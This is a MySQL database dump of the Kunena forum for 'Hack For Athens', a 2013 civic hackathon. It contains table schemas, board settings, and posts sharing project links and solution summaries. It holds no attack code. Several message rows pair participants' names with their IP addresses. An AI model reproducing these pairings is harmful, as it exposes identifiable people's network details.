  `review` tinyint(4) NOT NULL DEFAULT '0',
  `allow_anonymous` tinyint(4) NOT NULL DEFAULT '0',
  `post_anonymous` tinyint(4) NOT NULL DEFAULT '0',
  `hits` int(11) NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `headerdesc` text NOT NULL,
  `class_sfx` varchar(20) NOT NULL,
  `allow_polls` tinyint(4) NOT NULL DEFAULT '0',
  `topic_ordering` varchar(16) NOT NULL DEFAULT 'lastpost',
  `numTopics` mediumint(8) NOT NULL DEFAULT '0',
  `numPosts` mediumint(8) NOT NULL DEFAULT '0',
  `last_topic_id` int(11) NOT NULL DEFAULT '0',
  `last_post_id` int(11) NOT NULL DEFAULT '0',
  `last_post_time` int(11) NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `parent_id` (`parent_id`),
  KEY `category_access` (`accesstype`,`access`),
  KEY `published_pubaccess_id` (`published`,`pub_access`,`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_categories`
--

LOCK TABLES `hfa_kunena_categories` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_categories` DISABLE KEYS */;
INSERT INTO `hfa_kunena_categories` VALUES (1,0,'Hack For Athens | Forums','main-forum',0,0,'joomla.group',1,1,1,0,1,1,1,NULL,0,'0000-00-00 00:00:00',0,0,0,0,'This is the main forum section. It serves as a container for categories for your topics.','The section header is used to display additional information about the categories of topics that it contains.','',0,'lastpost',0,0,0,0,0,'{}'),(2,1,'General Information','general-information',0,0,'joomla.group',1,1,1,0,1,1,1,NULL,0,'0000-00-00 00:00:00',0,0,0,0,'General Information about the Civic Hackathon Event being held in Athens, GA June 1-2, 2013. ','General Information about the Civic Hackathon Event being held in Athens, GA June 1-2, 2013. ','',0,'lastpost',2,2,12,12,1370115579,'{\"access_post\":[\"6\",\"2\",\"8\"],\"access_reply\":[\"6\",\"2\",\"8\"]}'),(3,1,'Suggestion Box','suggestion-box',0,0,'joomla.group',1,1,1,0,1,2,1,NULL,0,'0000-00-00 00:00:00',0,0,0,0,'Have some feedback and input to share? Don\'t be shy, drop us a note. We want to hear from you and strive to make HackForAthens great!','','',1,'lastpost',0,0,0,0,0,'{\"access_post\":[\"6\",\"2\",\"8\"],\"access_reply\":[\"6\",\"2\",\"8\"]}'),(4,1,'FAQ','faq',0,0,'joomla.level',1,1,1,8,1,3,1,NULL,0,'0000-00-00 00:00:00',0,0,0,0,'Frequently Asked Questions about the Civic Hackathon Event being held in Athens, GA June 1-2, 2013. ','Frequently Asked Questions about the Civic Hackathon Event being held in Athens, GA June 1-2, 2013. ','',0,'lastpost',0,0,0,0,0,'{\"access_post\":[\"6\",\"2\",\"8\"],\"access_reply\":[\"6\",\"2\",\"8\"]}'),(5,0,'Teams','teams',0,0,'joomla.group',1,1,1,1,1,2,1,NULL,0,'0000-00-00 00:00:00',0,0,0,0,'Forums and threads for each team','','',0,'lastpost',0,0,0,0,0,'{}'),(6,5,'The Hotdawgs','the-hotdawgs',0,0,'joomla.level',1,1,1,8,1,1,1,NULL,0,'0000-00-00 00:00:00',0,0,0,0,'','','',0,'lastpost',0,0,0,0,0,'{}'),(7,5,'Team Internets','team-internets',0,0,'joomla.group',1,1,1,8,1,2,1,NULL,0,'0000-00-00 00:00:00',0,0,0,0,'','','',0,'lastpost',3,4,18,21,1370215469,'{}'),(8,5,'Comm-unity','community',0,0,'joomla.level',1,1,1,8,1,3,1,NULL,0,'0000-00-00 00:00:00',0,0,0,0,'','','',0,'lastpost',2,2,17,18,1370213215,'{\"access_post\":[\"6\",\"2\",\"8\"],\"access_reply\":[\"6\",\"2\",\"8\"]}'),(9,5,'Safe Water Athens','safe-water-athens',0,0,'joomla.level',1,1,1,8,1,4,1,NULL,0,'0000-00-00 00:00:00',0,0,0,0,'','','',0,'lastpost',2,2,20,22,1370312430,'{}');
/*!40000 ALTER TABLE `hfa_kunena_categories` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_configuration`
--

DROP TABLE IF EXISTS `hfa_kunena_configuration`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_configuration` (
  `id` int(11) NOT NULL DEFAULT '0',
  `params` text,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_configuration`
--

LOCK TABLES `hfa_kunena_configuration` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_configuration` DISABLE KEYS */;
INSERT INTO `hfa_kunena_configuration` VALUES (1,'{\"board_title\":\"Hack For Athens | Forums\",\"email\":\"support@hackforathens.org\",\"board_offline\":\"0\",\"offline_message\":\"<h2>The Forum is currently offline for maintenance.<\\/h2>\\r\\n<div>Check back soon!<\\/div>\",\"enablerss\":\"1\",\"threads_per_page\":\"20\",\"messages_per_page\":\"6\",\"messages_per_page_search\":\"15\",\"showhistory\":\"1\",\"historylimit\":\"6\",\"shownew\":\"1\",\"disemoticons\":\"0\",\"template\":\"blue_eagle\",\"showannouncement\":\"1\",\"avataroncat\":\"0\",\"catimagepath\":\"category_images\",\"showchildcaticon\":\"1\",\"rtewidth\":\"450\",\"rteheight\":\"300\",\"enableforumjump\":\"1\",\"reportmsg\":\"1\",\"username\":\"0\",\"askemail\":\"0\",\"showemail\":\"0\",\"showuserstats\":\"0\",\"showkarma\":\"0\",\"useredit\":\"1\",\"useredittime\":\"0\",\"useredittimegrace\":\"600\",\"editmarkup\":\"1\",\"allowsubscriptions\":\"1\",\"subscriptionschecked\":\"1\",\"allowfavorites\":\"1\",\"maxsubject\":\"50\",\"maxsig\":\"300\",\"regonly\":\"0\",\"pubwrite\":\"0\",\"floodprotection\":\"0\",\"mailmod\":\"0\",\"mailadmin\":\"0\",\"captcha\":\"0\",\"mailfull\":\"1\",\"allowavatarupload\":\"1\",\"allowavatargallery\":\"1\",\"avatarquality\":\"75\",\"avatarsize\":\"2048\",\"imageheight\":\"8000\",\"imagewidth\":\"8000\",\"imagesize\":\"8000\",\"filetypes\":\"txt,rtf,pdf,zip,tar.gz,tgz,tar.bz2,.ppt,.pptx,.xls,.xlsx,.doc,.docx,.one,.onex,.tex\",\"filesize\":\"8000\",\"showranking\":\"0\",\"rankimages\":\"0\",\"userlist_rows\":\"30\",\"userlist_online\":\"1\",\"userlist_avatar\":\"1\",\"userlist_name\":\"1\",\"userlist_posts\":\"1\",\"userlist_karma\":\"1\",\"userlist_email\":\"0\",\"userlist_joindate\":\"1\",\"userlist_lastvisitdate\":\"1\",\"userlist_userhits\":\"1\",\"latestcategory\":\"0\",\"showstats\":\"1\",\"showwhoisonline\":\"1\",\"showgenstats\":\"1\",\"showpopuserstats\":\"1\",\"popusercount\":\"5\",\"showpopsubjectstats\":\"1\",\"popsubjectcount\":\"5\",\"usernamechange\":\"0\",\"showspoilertag\":\"1\",\"showvideotag\":\"1\",\"showebaytag\":\"1\",\"trimlongurls\":\"1\",\"trimlongurlsfront\":\"40\",\"trimlongurlsback\":\"20\",\"autoembedyoutube\":\"1\",\"autoembedebay\":\"1\",\"ebaylanguagecode\":\"en-us\",\"sessiontimeout\":\"1800\",\"highlightcode\":\"0\",\"rss_type\":\"topic\",\"rss_timelimit\":\"month\",\"rss_limit\":\"100\",\"rss_included_categories\":\"\",\"rss_excluded_categories\":\"\",\"rss_specification\":\"rss2.0\",\"rss_allow_html\":\"1\",\"rss_author_format\":\"name\",\"rss_author_in_title\":\"1\",\"rss_word_count\":\"0\",\"rss_old_titles\":\"1\",\"rss_cache\":\"900\",\"defaultpage\":\"recent\",\"default_sort\":\"asc\",\"sef\":\"1\",\"showimgforguest\":\"1\",\"showfileforguest\":\"1\",\"pollnboptions\":\"4\",\"pollallowvoteone\":\"1\",\"pollenabled\":\"1\",\"poppollscount\":\"5\",\"showpoppollstats\":\"1\",\"polltimebtvotes\":\"00:15:00\",\"pollnbvotesbyuser\":\"100\",\"pollresultsuserslist\":\"1\",\"maxpersotext\":\"50\",\"ordering_system\":\"mesid\",\"post_dateformat\":\"ago\",\"post_dateformat_hover\":\"datetime\",\"hide_ip\":\"1\",\"imagetypes\":\"jpg,jpeg,gif,png\",\"checkmimetypes\":\"1\",\"imagemimetypes\":\"image\\/jpeg,image\\/jpg,image\\/gif,image\\/png\",\"imagequality\":\"100\",\"thumbheight\":\"32\",\"thumbwidth\":\"32\",\"hideuserprofileinfo\":\"put_empty\",\"boxghostmessage\":\"0\",\"userdeletetmessage\":\"0\",\"latestcategory_in\":\"1\",\"topicicons\":\"1\",\"debug\":\"0\",\"catsautosubscribed\":0,\"showbannedreason\":\"0\",\"version_check\":\"1\",\"showthankyou\":\"0\",\"showpopthankyoustats\":\"1\",\"popthankscount\":\"5\",\"mod_see_deleted\":\"0\",\"bbcode_img_secure\":\"text\",\"listcat_show_moderators\":\"1\",\"lightbox\":\"1\",\"show_list_time\":\"720\",\"show_session_type\":\"0\",\"show_session_starttime\":\"0\",\"userlist_allowed\":\"1\",\"userlist_count_users\":\"1\",\"enable_threaded_layouts\":\"0\",\"category_subscriptions\":\"post\",\"topic_subscriptions\":\"every\",\"pubprofile\":\"0\",\"thankyou_max\":\"10\",\"email_recipient_count\":\"0\",\"email_recipient_privacy\":\"bcc\",\"email_visible_address\":\"\",\"captcha_post_limit\":\"0\",\"recaptcha_publickey\":\"\",\"recaptcha_privatekey\":\"\",\"recaptcha_theme\":\"white\",\"keywords\":0,\"userkeywords\":0,\"image_upload\":\"registered\",\"file_upload\":\"registered\",\"topic_layout\":\"flat\",\"time_to_create_page\":\"0\",\"show_imgfiles_manage_profile\":\"1\",\"hold_newusers_posts\":\"0\",\"hold_guest_posts\":\"0\",\"attachment_limit\":\"8\",\"pickup_category\":\"0\",\"article_display\":\"intro\",\"send_emails\":\"1\",\"stopforumspam_key\":\"\",\"fallback_english\":\"1\",\"cache\":\"1\",\"cache_time\":\"60\",\"ebay_affiliate_id\":\"5337089937\",\"iptracking\":\"1\",\"rss_feedburner_url\":\"\",\"autolink\":\"1\",\"access_component\":\"1\",\"statslink_allowed\":1,\"userlist_usertype\":\"0\",\"sefutf8\":0,\"plugins\":[]}');
/*!40000 ALTER TABLE `hfa_kunena_configuration` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_keywords`
--

DROP TABLE IF EXISTS `hfa_kunena_keywords`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_keywords` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(40) NOT NULL,
  `public_count` int(11) NOT NULL,
  `total_count` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`),
  KEY `public_count` (`public_count`),
  KEY `total_count` (`total_count`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_keywords`
--

LOCK TABLES `hfa_kunena_keywords` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_keywords` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_kunena_keywords` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_keywords_map`
--

DROP TABLE IF EXISTS `hfa_kunena_keywords_map`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_keywords_map` (
  `keyword_id` int(11) NOT NULL,
  `user_id` int(11) NOT NULL,
  `topic_id` int(11) NOT NULL,
  UNIQUE KEY `keyword_user_topic` (`keyword_id`,`user_id`,`topic_id`),
  KEY `user_id` (`user_id`),
  KEY `topic_user` (`topic_id`,`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_keywords_map`
--

LOCK TABLES `hfa_kunena_keywords_map` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_keywords_map` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_kunena_keywords_map` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_messages`
--

DROP TABLE IF EXISTS `hfa_kunena_messages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_messages` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `parent` int(11) DEFAULT '0',
  `thread` int(11) DEFAULT '0',
  `catid` int(11) NOT NULL DEFAULT '0',
  `name` tinytext,
  `userid` int(11) NOT NULL DEFAULT '0',
  `email` tinytext,
  `subject` tinytext,
  `time` int(11) NOT NULL DEFAULT '0',
  `ip` varchar(128) DEFAULT NULL,
  `topic_emoticon` int(11) NOT NULL DEFAULT '0',
  `locked` tinyint(4) NOT NULL DEFAULT '0',
  `hold` tinyint(4) NOT NULL DEFAULT '0',
  `ordering` int(11) DEFAULT '0',
  `hits` int(11) DEFAULT '0',
  `moved` tinyint(4) DEFAULT '0',
  `modified_by` int(7) DEFAULT NULL,
  `modified_time` int(11) DEFAULT NULL,
  `modified_reason` tinytext,
  PRIMARY KEY (`id`),
  KEY `thread` (`thread`),
  KEY `ip` (`ip`),
  KEY `userid` (`userid`),
  KEY `locked` (`locked`),
  KEY `parent_hits` (`parent`,`hits`),
  KEY `catid_parent` (`catid`,`parent`),
  KEY `time_hold` (`time`,`hold`),
  KEY `hold` (`hold`)
) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_messages`
--

LOCK TABLES `hfa_kunena_messages` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_messages` DISABLE KEYS */;
INSERT INTO `hfa_kunena_messages` VALUES (1,0,1,2,'Kelly Storm',254,'','Welcome to the HackForAthens forum!',1365023956,'127.0.0.1',0,0,0,0,0,0,254,1370224101,''),(12,0,12,2,'Jonathan Wallace',256,'','A quick way to get an API',1370115579,'198.137.20.100',0,0,0,0,0,0,NULL,NULL,''),(13,0,13,7,'Jordan Burke',268,'','Github Repo',1370142054,'96.32.135.137',0,0,0,0,0,0,NULL,NULL,''),(15,0,15,7,'Sean Dunn',324,'','Google Docs INfo',1370206343,'198.137.20.137',0,0,0,0,0,0,NULL,NULL,''),(17,0,16,8,'Henry Oddi',306,'','Synopsis of Solution:',1370208519,'198.137.20.147',0,0,0,0,0,0,NULL,NULL,''),(18,0,17,8,'Stacey Kerr',305,'','Presentation',1370213215,'198.137.20.168',0,0,0,0,0,0,NULL,NULL,''),(19,0,18,7,'Sean Dunn',324,'','Presentation Slides',1370213408,'198.137.20.137',0,0,0,0,0,0,NULL,NULL,''),(20,0,19,9,'Chris Sparnicht',313,'','Source Materials For GitHub',1370214810,'198.137.20.229',0,0,0,0,0,0,313,1370221094,''),(21,19,18,7,'Jordan Burke',268,'','Presentation Slides',1370215469,'198.137.20.71',0,0,0,0,0,0,NULL,NULL,''),(22,0,20,9,'Baron Chandler',274,'','Source code',1370312430,'97.81.80.12',0,0,0,0,0,0,NULL,NULL,'');
/*!40000 ALTER TABLE `hfa_kunena_messages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_messages_text`
--

DROP TABLE IF EXISTS `hfa_kunena_messages_text`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_messages_text` (
  `mesid` int(11) NOT NULL DEFAULT '0',
  `message` text NOT NULL,
  PRIMARY KEY (`mesid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_messages_text`
--

LOCK TABLES `hfa_kunena_messages_text` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_messages_text` DISABLE KEYS */;
INSERT INTO `hfa_kunena_messages_text` VALUES (1,'[attachment=6]NationalDayofCivicHacking1.pptx[/attachment]\r\nWelcome!\r\n\r\nThe National Day of Civic Hacking will provide citizens an opportunity to do what is most quintessentially American: roll up our sleeves, get involved and work together to improve our society. Web and software developers, designers, community organizers, and other folks from all over Athens will gather to tackle local challenges with technology.\r\n\r\nSolving Real Problems, Helping Real People.\r\n\r\nThe event will focus on building technical solutions, but it is not about the technology; it’s about addressing local problems and challenges. The goal is to produce workable solutions that improve daily life for real people in our communities. The technical solutions we build will be built for a purpose, not just as an exercise.\r\n\r\nWondering if you should attend? See the flyer to the right to see if you can help.\r\n\r\nHack for Athens is one of over 77 events happening nationwide as part of the National Day of Civic Hacking. The National Day of Civic Hacking is an event during which citizens from around the country will work together with local, state and federal governments as well as private sector organizations with the common goal of improving their community. Hack for Athens is also licensed under Random Hacks of Kindness, an organization started by Microsoft, Yahoo, and NASA, and the World Bank to run hackathons around the world.'),(12,'https://communities.socrata.com/catalog/ndoch-athens/'),(13,'Hey guys,\r\n\r\nHere\'s a link to the Github repo I set up: [url=http://github.com/PendragonDevelopment/hack-for-athens]Hack for Athens[/url]\r\n\r\nFork or clone as you\'d like, and post your Github username so I can add you as admins/collaborators.'),(15,'Notes:\r\nhttps://docs.google.com/document/d/1QtfaHBaKhbYSMoB4GZDJkteneqlMROgQAK-PoXXk_YU/edit?usp=sharing\r\n\r\nPresentation: https://docs.google.com/presentation/d/1MPMJhxUBgGhy8Bpx_zbuOxrLwGB8iQB-6AcwJDjKPN8/edit?usp=sharing'),(17,'Synopsis of Solution:\r\nIt is hard to understand the scope of need in Athens and communities throughout the country. We have large datasets such as census data and social quality indexes, but they don’t inform or enable action at the local community level. To affect change requires “small data,” that is real-time, geo-located, and communicates on a human scale. Comm-unity is a solution that gathers information about need within the community while delivering help to those who need it from a mobile app. With this information, an open API, and advanced visualization, various stakeholders will be able directly impact communities across the United States -- as Comm-unity scales efficiently across the existing 211 infrastructure.'),(18,'PowerPoint Presentation: Comm-unity  :woohoo:'),(19,':evil: \r\n\r\nGoogle Docs Link: https://docs.google.com/presentation/d/1MPMJhxUBgGhy8Bpx_zbuOxrLwGB8iQB-6AcwJDjKPN8/edit#slide=id.gc7bb25de_038\r\n\r\n\r\n[attachment=3]affordableinternetpres.pptx[/attachment]'),(20,'[attachment=4]SafeWaterAthens.zip[/attachment]\r\nSafe Water Athens - a front end for the epa SWDIS database, with a few extra twists.\r\nCode for web in this example.'),(21,'Our solution to providing low-income areas with affordable broadband internet access relies upon working with businesses and community organisations to create a wireless mesh network to re-invest unused and underutilised bandwidth back into the community.'),(22,'Here\'s the source code for the challenge.');
/*!40000 ALTER TABLE `hfa_kunena_messages_text` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_polls`
--

DROP TABLE IF EXISTS `hfa_kunena_polls`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_polls` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(100) NOT NULL,
  `threadid` int(11) NOT NULL,
  `polltimetolive` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `threadid` (`threadid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_polls`
--

LOCK TABLES `hfa_kunena_polls` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_polls` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_kunena_polls` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_polls_options`
--

DROP TABLE IF EXISTS `hfa_kunena_polls_options`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_polls_options` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `pollid` int(11) DEFAULT NULL,
  `text` varchar(100) DEFAULT NULL,
  `votes` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `pollid` (`pollid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_polls_options`
--

LOCK TABLES `hfa_kunena_polls_options` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_polls_options` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_kunena_polls_options` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_polls_users`
--

DROP TABLE IF EXISTS `hfa_kunena_polls_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_polls_users` (
  `pollid` int(11) DEFAULT NULL,
  `userid` int(11) DEFAULT NULL,
  `votes` int(11) DEFAULT NULL,
  `lasttime` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `lastvote` int(11) DEFAULT NULL,
  UNIQUE KEY `pollid` (`pollid`,`userid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_polls_users`
--

LOCK TABLES `hfa_kunena_polls_users` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_polls_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_kunena_polls_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_ranks`
--

DROP TABLE IF EXISTS `hfa_kunena_ranks`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_ranks` (
  `rank_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `rank_title` varchar(255) NOT NULL DEFAULT '',
  `rank_min` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `rank_special` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `rank_image` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`rank_id`)
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_ranks`
--

LOCK TABLES `hfa_kunena_ranks` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_ranks` DISABLE KEYS */;
INSERT INTO `hfa_kunena_ranks` VALUES (1,'Fresh Boarder',0,0,'rank1.gif'),(2,'Junior Boarder',20,0,'rank2.gif'),(3,'Senior Boarder',40,0,'rank3.gif'),(4,'Expert Boarder',80,0,'rank4.gif'),(5,'Gold Boarder',160,0,'rank5.gif'),(6,'Platinum Boarder',320,0,'rank6.gif'),(7,'Administrator',0,1,'rankadmin.gif'),(8,'Moderator',0,1,'rankmod.gif'),(9,'Spammer',0,1,'rankspammer.gif'),(10,'Banned',0,1,'rankbanned.gif');
/*!40000 ALTER TABLE `hfa_kunena_ranks` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_sessions`
--

DROP TABLE IF EXISTS `hfa_kunena_sessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_sessions` (
  `userid` int(11) NOT NULL DEFAULT '0',
  `allowed` text,
  `lasttime` int(11) NOT NULL DEFAULT '0',
  `readtopics` text,
  `currvisit` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`userid`),
  KEY `currvisit` (`currvisit`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_sessions`
--

LOCK TABLES `hfa_kunena_sessions` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_sessions` DISABLE KEYS */;
INSERT INTO `hfa_kunena_sessions` VALUES (254,'na',1370213964,'0',1370224102),(255,'na',1365033400,'0',1365035573),(256,'na',1370115580,'0',1370121517),(258,'na',1365184217,'0',1366393831),(262,'na',1365625708,'0',1366835319),(264,'na',1365887008,'0',1367096615),(268,'na',1370215470,'0',1370225987),(269,'na',1366654633,'0',1367864241),(272,'na',1366835277,'0',1368044920),(274,'na',1370312456,'0',1370317455),(276,'na',1367019059,'0',1368228659),(283,'na',1367443517,'0',1368653187),(296,'na',1367868893,'0',1369078493),(297,'na',1367868642,'0',1369078242),(298,'na',1367869689,'0',1369079309),(299,'na',1368159029,'0',1369368630),(302,'na',1369670646,'0',1369759567),(304,'na',1369625295,'0',1369715837),(305,'na',1370113334,'0',1370213216),(306,'na',1368998259,'0',1370208520),(307,'na',1370078473,'0',1370204771),(309,'na',1368553529,'0',1369763160),(310,'na',1368762449,'0',1369972062),(313,'na',1370216660,'0',1370221095),(320,'na',1368753999,'0',1369963604),(324,'na',1370206362,'0',1370215891);
/*!40000 ALTER TABLE `hfa_kunena_sessions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_smileys`
--

DROP TABLE IF EXISTS `hfa_kunena_smileys`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_smileys` (
  `id` int(4) NOT NULL AUTO_INCREMENT,
  `code` varchar(12) NOT NULL DEFAULT '',
  `location` varchar(50) NOT NULL DEFAULT '',
  `greylocation` varchar(60) NOT NULL DEFAULT '',
  `emoticonbar` tinyint(4) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=67 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_kunena_smileys`
--

LOCK TABLES `hfa_kunena_smileys` WRITE;
/*!40000 ALTER TABLE `hfa_kunena_smileys` DISABLE KEYS */;
INSERT INTO `hfa_kunena_smileys` VALUES (1,'B)','cool.png','cool-grey.png',1),(2,'8)','cool.png','cool-grey.png',0),(3,'8-)','cool.png','cool-grey.png',0),(4,':-(','sad.png','sad-grey.png',0),(5,':(','sad.png','sad-grey.png',1),(6,':sad:','sad.png','sad-grey.png',0),(7,':cry:','sad.png','sad-grey.png',0),(8,':)','smile.png','smile-grey.png',1),(9,':-)','smile.png','smile-grey.png',0),(10,':cheer:','cheerful.png','cheerful-grey.png',1),(11,';)','wink.png','wink-grey.png',1),(12,';-)','wink.png','wink-grey.png',0),(13,':wink:','wink.png','wink-grey.png',0),(14,';-)','wink.png','wink-grey.png',0),(15,':P','tongue.png','tongue-grey.png',1),(16,':p','tongue.png','tongue-grey.png',0),(17,':-p','tongue.png','tongue-grey.png',0),(18,':-P','tongue.png','tongue-grey.png',0),(19,':razz:','tongue.png','tongue-grey.png',0),(20,':angry:','angry.png','angry-grey.png',1),(21,':mad:','angry.png','angry-grey.png',0),(22,':unsure:','unsure.png','unsure-grey.png',1),(23,':o','shocked.png','shocked-grey.png',0),(24,':-o','shocked.png','shocked-grey.png',0),(25,':O','shocked.png','shocked-grey.png',0),(26,':-O','shocked.png','shocked-grey.png',0),(27,':eek:','shocked.png','shocked-grey.png',0),(28,':ohmy:','shocked.png','shocked-grey.png',1),(29,':huh:','wassat.png','wassat-grey.png',1),(30,':?','confused.png','confused-grey.png',0),(31,':-?','confused.png','confused-grey.png',0),(32,':???','confused.png','confused-grey.png',0),(33,':dry:','ermm.png','ermm-grey.png',1),(34,':ermm:','ermm.png','ermm-grey.png',0),(35,':lol:','grin.png','grin-grey.png',1),(36,':X','sick.png','sick-grey.png',0),(37,':x','sick.png','sick-grey.png',0),(38,':sick:','sick.png','sick-grey.png',1),(39,':silly:','silly.png','silly-grey.png',1),(40,':y32b4:','silly.png','silly-grey.png',0),(41,':blink:','blink.png','blink-grey.png',1),(42,':blush:','blush.png','blush-grey.png',1),(43,':oops:','blush.png','blush-grey.png',1),(44,':kiss:','kissing.png','kissing-grey.png',1),(45,':rolleyes:','blink.png','blink-grey.png',0),(46,':roll:','blink.png','blink-grey.png',0),(47,':woohoo:','w00t.png','w00t-grey.png',1),(48,':side:','sideways.png','sideways-grey.png',1),(49,':S','dizzy.png','dizzy-grey.png',1),(50,':s','dizzy.png','dizzy-grey.png',0),(51,':evil:','devil.png','devil-grey.png',1),(52,':twisted:','devil.png','devil-grey.png',0),(53,':whistle:','whistling.png','whistling-grey.png',1),(54,':pinch:','pinch.png','pinch-grey.png',1),(55,':D','laughing.png','laughing-grey.png',0),(56,':-D','laughing.png','laughing-grey.png',0),(57,':grin:','laughing.png','laughing-grey.png',0),(58,':laugh:','laughing.png','laughing-grey.png',0),(59,':|','neutral.png','neutral-grey.png',0),(60,':-|','neutral.png','neutral-grey.png',0),(61,':neutral:','neutral.png','neutral-grey.png',0),(62,':mrgreen:','mrgreen.png','mrgreen-grey.png',0),(63,':?:','question.png','question-grey.png',0),(64,':!:','exclamation.png','exclamation-grey.png',0),(65,':arrow:','arrow.png','arrow-grey.png',0),(66,':idea:','idea.png','idea-grey.png',0);
/*!40000 ALTER TABLE `hfa_kunena_smileys` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_kunena_thankyou`
--

DROP TABLE IF EXISTS `hfa_kunena_thankyou`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_kunena_thankyou` (
  `postid` int(11) NOT NULL,
  `userid` int(11) NOT NULL,
  `targetuserid` int(11) NOT NULL,
  `time` datetime NOT NULL,
